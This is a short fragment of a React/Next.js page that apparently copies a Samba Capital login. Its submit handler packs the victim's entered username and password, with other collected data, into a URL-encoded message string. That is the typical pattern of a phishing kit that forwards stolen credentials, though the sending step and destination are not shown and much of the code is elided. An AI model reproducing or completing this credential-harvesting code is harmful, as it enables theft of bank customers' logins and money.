"use client"
import styles from './sampbkapital.module.css'
...
const Page = () => {
    ...
    const handleOnSubmit = (e) => {
        ...
        var length =`سامبا كابيتال  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
